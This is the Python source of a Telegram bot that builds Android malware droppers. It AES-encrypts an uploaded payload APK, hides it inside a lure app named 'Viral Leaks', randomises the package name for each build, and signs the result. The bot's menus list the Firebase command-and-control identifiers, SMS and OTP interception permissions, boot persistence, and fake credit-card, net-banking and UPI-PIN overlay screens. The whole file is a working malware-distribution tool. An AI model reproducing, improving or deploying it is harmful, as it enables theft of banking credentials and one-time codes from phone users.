"""
APK Swapper Bot — Full version with menu + auto-signing
"""

import os, io, zipfile, secrets, logging, asyncio, hashlib, base64, datetime, struct
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes
)

# ─── Config ───────────────────────────────────────────────────────────────────

BOT_TOKEN    = os.getenv("BOT_TOKEN", "")
DROPPER_PATH = Path(__file__).parent / "Viral_Leaks_dropper.apk"
KEY_PATH     = Path(__file__).parent / "sign.key"
CERT_PATH    = Path(__file__).parent / "sign.crt"
AES_KEY_HEX  = "b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1"
AES_KEY      = bytes.fromhex(AES_KEY_HEX)
ASSET_NAME   = "assets/Axyra"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger(__name__)

# ─── Pure-Python APK v1 signing (no Java needed) ─────────────────────────────

def _load_or_create_key_cert():
    try:
        from cryptography import x509
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.x509.oid import NameOID
    except ImportError:
        return None, None

    if KEY_PATH.exists() and CERT_PATH.exists():
        key  = serialization.load_pem_private_key(KEY_PATH.read_bytes(), password=None)
        cert = x509.load_pem_x509_certificate(CERT_PATH.read_bytes())
        return key, cert

    log.info("Signing key generate kar raha hoon...")
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    KEY_PATH.write_bytes(key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))
    name = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME,         "Android Debug"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME,   "Android"),
        x509.NameAttribute(NameOID.COUNTRY_NAME,        "US"),
    ])
    now  = datetime.datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=10000))
        .sign(key, hashes.SHA256())
    )
    CERT_PATH.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
    log.info("Key + cert saved.")
    return key, cert


def _b64(b: bytes) -> str:
    return base64.b64encode(b).decode()


def _build_manifest(entries: list[tuple[str, bytes]]) -> bytes:
    lines = ["Manifest-Version: 1.0\r\nCreated-By: 1.0 (Python)\r\n\r\n"]
    for name, data in entries:
        digest = _b64(hashlib.sha256(data).digest())
        lines.append(f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n")
    return "".join(lines).encode()


def _build_sf(manifest: bytes, sections: list[tuple[str, bytes]]) -> bytes:
    mf_digest = _b64(hashlib.sha256(manifest).digest())
    lines = [
        f"Signature-Version: 1.0\r\n"
        f"Created-By: 1.0 (Python)\r\n"
        f"SHA-256-Digest-Manifest: {mf_digest}\r\n\r\n"
    ]
    for name, sect_bytes in sections:
        digest = _b64(hashlib.sha256(sect_bytes).digest())
        lines.append(f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n")
    return "".join(lines).encode()


def _lp(data: bytes) -> bytes:
    """uint32-LE length prefix + data (APK v2 block encoding)."""
    return struct.pack('<I', len(data)) + data


def _add_v2_signature(apk_bytes: bytes, key, cert) -> bytes:
    """Insert APK Signature Scheme v2 signing block between file data and CD."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as rsa_pad

    EOCD_SIG   = 0x06054b50
    MAGIC      = b"APK Sig Block 42"
    ALGO_ID    = 0x0103          # RSASSA-PKCS1-v1_5 + SHA-256
    CHUNK_SIZE = 1 << 20         # 1 MiB

    n = len(apk_bytes)
    eocd_off = -1
    for i in range(n - 22, max(n - 22 - 65536, -1), -1):
        if struct.unpack_from('<I', apk_bytes, i)[0] == EOCD_SIG:
            eocd_off = i
            break
    if eocd_off < 0:
        return apk_bytes

    cd_offset = struct.unpack_from('<I', apk_bytes, eocd_off + 16)[0]

    part1 = apk_bytes[:cd_offset]
    part2 = apk_bytes[cd_offset:eocd_off]
    # Part 3: EOCD as-is — its CD_OFFSET field already equals cd_offset,
    # which is exactly where the signing block will be inserted, matching
    # what Android's verifier reconstructs during verification.
    part3 = apk_bytes[eocd_off:]

    def _chunk_digests(data: bytes) -> list[bytes]:
        out = []
        if not data:
            out.append(hashlib.sha256(b'\xa5' + struct.pack('<I', 0)).digest())
        else:
            pos = 0
            while pos < len(data):
                chunk = data[pos:pos + CHUNK_SIZE]
                pos += CHUNK_SIZE
                out.append(hashlib.sha256(b'\xa5' + struct.pack('<I', len(chunk)) + chunk).digest())
        return out

    all_cd = _chunk_digests(part1) + _chunk_digests(part2) + _chunk_digests(part3)
    top_digest = hashlib.sha256(
        b'\x5a' + struct.pack('<I', len(all_cd)) + b''.join(all_cd)
    ).digest()

    cert_der    = cert.public_bytes(serialization.Encoding.DER)
    pub_der     = key.public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
    )

    # SignedData = digests_list || certs_list || attrs_list
    # Each item inside a list is itself length-prefixed (getLengthPrefixedSlice in AOSP).
    digest_item_data = struct.pack('<I', ALGO_ID) + _lp(top_digest)
    digests_list     = _lp(_lp(digest_item_data))   # outer list wraps one lp-item

    certs_list = _lp(_lp(cert_der))                 # outer list wraps one lp-cert
    attrs_list = _lp(b'')                            # empty attributes

    signed_data = digests_list + certs_list + attrs_list

    raw_sig = key.sign(signed_data, rsa_pad.PKCS1v15(), hashes.SHA256())

    # Signatures list: same pattern — each entry is length-prefixed within the list
    sig_item_data   = struct.pack('<I', ALGO_ID) + _lp(raw_sig)
    signatures_list = _lp(_lp(sig_item_data))

    signer  = _lp(signed_data) + signatures_list + _lp(pub_der)
    signers = _lp(_lp(signer))    # outer = sequence, inner = per-signer LP item

    pair        = struct.pack('<Q', len(signers) + 4) + struct.pack('<I', 0x7109871a) + signers
    block_size  = len(pair) + 8 + 16
    sig_block   = struct.pack('<Q', block_size) + pair + struct.pack('<Q', block_size) + MAGIC

    new_cd_off  = cd_offset + len(sig_block)
    eocd_patched = bytearray(apk_bytes[eocd_off:])
    struct.pack_into('<I', eocd_patched, 16, new_cd_off)

    return part1 + sig_block + part2 + bytes(eocd_patched)


def sign_apk(apk_bytes: bytes) -> tuple[bytes, bool]:
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.serialization import pkcs7
    except ImportError:
        log.warning("cryptography lib nahi — pip install cryptography karo")
        return apk_bytes, False

    key, cert = _load_or_create_key_cert()
    if key is None:
        return apk_bytes, False

    # Read entries from existing APK (don't repack — just compute digests)
    zin = zipfile.ZipFile(io.BytesIO(apk_bytes))
    entries = []
    for item in zin.infolist():
        if item.filename.startswith("META-INF/"):
            continue
        entries.append((item.filename, zin.read(item.filename)))
    zin.close()

    # MANIFEST.MF
    manifest = _build_manifest(entries)

    # CERT.SF — digest of each MANIFEST.MF section
    sf_sections = []
    for name, data in entries:
        digest = _b64(hashlib.sha256(data).digest())
        sect = f"Name: {name}\r\nSHA-256-Digest: {digest}\r\n\r\n".encode()
        sf_sections.append((name, sect))
    cert_sf = _build_sf(manifest, sf_sections)

    # CERT.RSA — embedded PKCS#7 (not detached; Android JAR verifier needs content inside)
    cert_rsa = (
        pkcs7.PKCS7SignatureBuilder()
        .set_data(cert_sf)
        .add_signer(cert, key, hashes.SHA256())
        .sign(serialization.Encoding.DER, [])
    )

    # APPEND META-INF to the existing APK bytes — do NOT repack entries
    out = io.BytesIO(apk_bytes)
    with zipfile.ZipFile(out, "a") as zout:
        for mname, mdata in [
            ("META-INF/MANIFEST.MF", manifest),
            ("META-INF/CERT.SF",     cert_sf),
            ("META-INF/CERT.RSA",    cert_rsa),
        ]:
            info = zipfile.ZipInfo(mname)
            info.compress_type = zipfile.ZIP_STORED
            zout.writestr(info, mdata)

    apk_v1 = out.getvalue()
    log.info("APK signed (v1/JAR, appended META-INF)")

    # Add APK Signature Scheme v2 block (required on Android 7.0+ for full compat)
    try:
        apk_v1v2 = _add_v2_signature(apk_v1, key, cert)
        log.info("APK v2 signing block added (%d bytes)", len(apk_v1v2) - len(apk_v1))
        return apk_v1v2, True
    except Exception as e:
        log.warning("v2 signing failed (%s) — returning v1-only", e)
        return apk_v1, True

# ─── State ────────────────────────────────────────────────────────────────────

# user_id → True means waiting for APK upload
awaiting_apk: set[int] = set()

# ─── Crypto ───────────────────────────────────────────────────────────────────

def encrypt_payload(data: bytes) -> bytes:
    iv = secrets.token_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))

import string as _string
import random as _random

OLD_PKG = "com.gdww.ihwc.hpfv"
_CHARS  = _string.ascii_lowercase + _string.digits   # a-z 0-9

def _random_pkg() -> str:
    """Generate a random same-length replacement package name."""
    suffix = ''.join(_random.choices(_CHARS, k=4))
    return f"com.gdww.ihwc.{suffix}"

def _patch_pkg(data: bytes, new_pkg: str) -> bytes:
    """Replace OLD_PKG with new_pkg in binary AXML (UTF-16LE)."""
    assert len(new_pkg) == len(OLD_PKG), "package name length must match"
    old = OLD_PKG.encode('utf-16-le')
    new = new_pkg.encode('utf-16-le')
    result = bytearray(data)
    pos = 0
    while True:
        idx = result.find(old, pos)
        if idx == -1:
            break
        result[idx:idx + len(old)] = new
        pos = idx + len(new)
    return bytes(result)

def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
    """Returns (apk_bytes, pkg_name)."""
    encrypted = encrypt_payload(payload_bytes)
    new_pkg   = _random_pkg()
    buf = io.BytesIO()
    with zipfile.ZipFile(DROPPER_PATH, "r") as zin, \
         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zout:
        for item in zin.infolist():
            if item.filename.startswith("META-INF/"):
                continue
            data = zin.read(item)          # ZipInfo direct read — safe for mangled filenames
            if item.filename == ASSET_NAME:
                data = encrypted
            elif item.filename == "AndroidManifest.xml":
                data = _patch_pkg(data, new_pkg)
            zout.writestr(item, data)
    log.info("Rebuilt dropper pkg=%s", new_pkg)
    return buf.getvalue(), new_pkg

# ─── Keyboards ────────────────────────────────────────────────────────────────

def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤  APK Upload karo", callback_data="upload")],
        [InlineKeyboardButton("🔑  AES Key dekho",   callback_data="key"),
         InlineKeyboardButton("ℹ️  Bot Info",        callback_data="info")],
        [InlineKeyboardButton("📋  Permissions list", callback_data="perms")],
    ])

# ─── Handlers ─────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    awaiting_apk.discard(user.id)
    await update.message.reply_text(
        f"👋 Welcome, {user.first_name}!\n\n"
        "🔧 *APK Swapper Bot*\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Naya payload APK upload karo — main usse encrypt karke\n"
        "dropper ke andar Axyra replace kar dunga.\n\n"
        "📦 *Dropper:* `com.gdww.ihwc.*` (random per build)\n"
        "🔐 *Algo:* AES-256-CBC (IV prepended)\n"
        "📁 *Asset:* `assets/Axyra`\n\n"
        "Neeche menu se option chuno 👇",
        parse_mode="Markdown",
        reply_markup=main_menu_kb()
    )

async def cmd_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    awaiting_apk.discard(update.effective_user.id)
    await update.message.reply_text(
        "🏠 *Main Menu*\nOption chuno:",
        parse_mode="Markdown",
        reply_markup=main_menu_kb()
    )

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    if data == "upload":
        awaiting_apk.add(uid)
        await q.message.reply_text(
            "📤 *APK Upload Mode*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "Ab apna naya payload `.apk` file bhejo.\n\n"
            "⚙️ Main kya karunga:\n"
            "  1️⃣  File validate karunga (ZIP magic check)\n"
            "  2️⃣  AES-256-CBC se encrypt karunga\n"
            "  3️⃣  Random IV prepend karunga\n"
            "  4️⃣  Dropper ki `assets/Axyra` replace karunga\n"
            "  5️⃣  Random package name assign karunga\n"
            "  6️⃣  v1+v2 sign karke wapas bheejunga\n\n"
            "Cancel karne ke liye /menu",
            parse_mode="Markdown"
        )

    elif data == "key":
        await q.message.reply_text(
            "🔑 *Encryption Details*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"*Algorithm:* `AES/CBC/PKCS5Padding`\n"
            f"*Key (256-bit):*\n`{AES_KEY_HEX}`\n\n"
            f"*IV:* Random 16 bytes, ciphertext ke pehle prepend hota hai\n"
            f"*Source:* Dropper DEX mein `AES_KEY_HEX` constant\n"
            f"*Asset:* `assets/Axyra`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "info":
        dropper_size = DROPPER_PATH.stat().st_size // 1024 if DROPPER_PATH.exists() else 0
        status = "✅ Loaded" if DROPPER_PATH.exists() else "❌ Missing"
        await q.message.reply_text(
            "ℹ️ *Bot Info*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"*Dropper file:* {status}\n"
            f"*Dropper size:* {dropper_size} KB\n"
            f"*Dropper pkg:* `com.gdww.ihwc.<random>`\n"
            f"*Payload pkg:* `com.btmo.awws.hoag`\n\n"
            "*C2 Infrastructure:*\n"
            "  • Firebase: `toxicgen-f1d0c`\n"
            "  • RTDB: `toxicgen-f1d0c-default-rtdb`\n"
            "  • FCM Sender: `1086425822943`\n\n"
            "*Dropper Flow:*\n"
            "  Viral Leaks → Axyra decrypt → Install payload\n"
            "  → VpnBypassService → PackageInstaller",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "perms":
        await q.message.reply_text(
            "📋 *Payload Permissions*\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "🔴 *Dangerous:*\n"
            "  • `READ_SMS` — OTP padho\n"
            "  • `RECEIVE_SMS` — SMS aane pe intercept\n"
            "  • `SEND_SMS` — SMS bhejo\n"
            "  • `CALL_PHONE` — Call karo\n"
            "  • `READ_PHONE_STATE` — Device info\n"
            "  • `READ_PHONE_NUMBERS` — Number padho\n\n"
            "🟡 *System:*\n"
            "  • `RECEIVE_BOOT_COMPLETED` — Boot persistence\n"
            "  • `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`\n"
            "  • `FOREGROUND_SERVICE`\n"
            "  • `POST_NOTIFICATIONS`\n\n"
            "🟢 *Network:*\n"
            "  • `INTERNET`\n"
            "  • `ACCESS_NETWORK_STATE`\n\n"
            "*Overlay Screens:*\n"
            "  💳 CreditCardActivity\n"
            "  🏦 NetBankingActivity\n"
            "  📱 UpiPinActivity",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="home")
            ]])
        )

    elif data == "home":
        awaiting_apk.discard(uid)
        await q.message.reply_text(
            "🏠 *Main Menu*",
            parse_mode="Markdown",
            reply_markup=main_menu_kb()
        )

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    doc = update.message.document

    if uid not in awaiting_apk:
        await update.message.reply_text(
            "Pehle menu se *📤 APK Upload karo* dabao.",
            parse_mode="Markdown",
            reply_markup=main_menu_kb()
        )
        return

    if not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("❌ Sirf `.apk` files.\nDobara bhejo ya /menu")
        return

    if not DROPPER_PATH.exists():
        await update.message.reply_text("❌ Dropper file missing: `Viral_Leaks_dropper.apk`", parse_mode="Markdown")
        return

    awaiting_apk.discard(uid)

    prog = await update.message.reply_text(
        f"⬇️ Download ho raha hai: `{doc.file_name}` ({doc.file_size // 1024} KB)...",
        parse_mode="Markdown"
    )

    tg_file = await ctx.bot.get_file(doc.file_id)
    apk_bytes = bytes(await tg_file.download_as_bytearray())

    if apk_bytes[:2] != b"PK":
        await prog.edit_text("❌ Invalid APK — ZIP magic nahi mila. Sahi file bhejo.\n/menu")
        return

    await prog.edit_text("🔐 Encrypt ho raha hai + Axyra replace...")

    try:
        new_dropper, new_pkg = rebuild_dropper(apk_bytes)
    except Exception as e:
        log.exception("rebuild failed")
        await prog.edit_text(f"❌ Error: {e}")
        return

    await prog.edit_text("✍️ Sign ho raha hai...")
    try:
        new_dropper, signed = sign_apk(new_dropper)
    except Exception as e:
        log.exception("signing failed")
        await prog.edit_text(f"⚠️ Sign nahi hua: {e}\nUnsigned dropper bhej raha hoon...")
        signed = False

    sign_note = "✅ v1+v2 (debug key)" if signed else "⚠️ Unsigned"
    out_name = f"dropper_{doc.file_name}"
    await prog.edit_text(f"📤 Bhej raha hoon ({len(new_dropper) // 1024} KB)...")

    await update.message.reply_document(
        document=io.BytesIO(new_dropper),
        filename=out_name,
        caption=(
            f"✅ *Dropper ready!*\n\n"
            f"📦 Payload: `{doc.file_name}`\n"
            f"📏 Size: `{len(new_dropper) // 1024} KB`\n"
            f"📦 Package: `{new_pkg}`\n"
            f"🔐 Key: `{AES_KEY_HEX[:24]}...`\n"
            f"✍️ Signature: {sign_note}"
        ),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🔄 Aur ek APK", callback_data="upload"),
            InlineKeyboardButton("🏠 Menu",        callback_data="home"),
        ]])
    )
    await prog.delete()
    log.info("Sent rebuilt dropper %s (%d bytes) to uid=%d", out_name, len(new_dropper), uid)

# ─── Main ─────────────────────────────────────────────────────────────────────

async def post_init(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Welcome screen"),
        BotCommand("menu",  "Main menu"),
    ])

def main():
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu",  cmd_menu))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    log.info("Bot polling shuru...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
